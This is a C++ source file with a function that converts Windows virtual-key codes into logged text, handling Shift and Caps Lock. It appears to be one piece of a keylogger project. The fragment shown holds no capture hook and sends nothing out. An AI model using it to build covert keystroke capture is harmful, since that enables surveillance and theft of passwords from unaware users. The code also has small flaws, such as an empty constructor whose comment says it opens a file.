//
// Created by actua on 5/21/2024.
//
#include "../include/Key.h"
#include <iostream>
#include <limits>
#include <windows.h>


// Constructor to open the file
// pass the file name by reference const means that the file name cannot be changed
Key::Key(const std::string &fname) {}

// Translate the key to a string to log
#include <cctype> // Include this at the top of your file

std::string Key::translateKey(const int key) {
   // Translate the key to a string
   std::string keyStr;
   switch(key) {
     case VK_RETURN:
       keyStr = "\n";
       break;
     case VK_SPACE:
       keyStr = " ";
       break;
     case VK_BACK:
       keyStr = "\b";
       break;
     case VK_TAB:
       keyStr = "\t";
       break;
     case OEM_CHARSET:
       keyStr = " ";
       break;
     default:
       // check state of the shift or caps lock
       const bool shift = (GetKeyState(VK_SHIFT) & 0x8000);
       const bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001); // Check if Caps Lock is on

     char ch;
     // handle the case some number is pressed that is out of bounds of char
     if (key >= std::numeric_limits<char>::min() && key <= std::numeric_limits<char>::max()) {
         ch = static_cast<char>(key);
      } else {
        ch = '?';
      }
       if (isalpha(ch)) {
           if (shift ^ capsLock) { // If either shift or caps lock is on, but not both
               keyStr = toupper(ch);
           } else {
               keyStr = tolower(ch);
           }
       } else {
           keyStr = ch;
       }
   }
   return keyStr;
}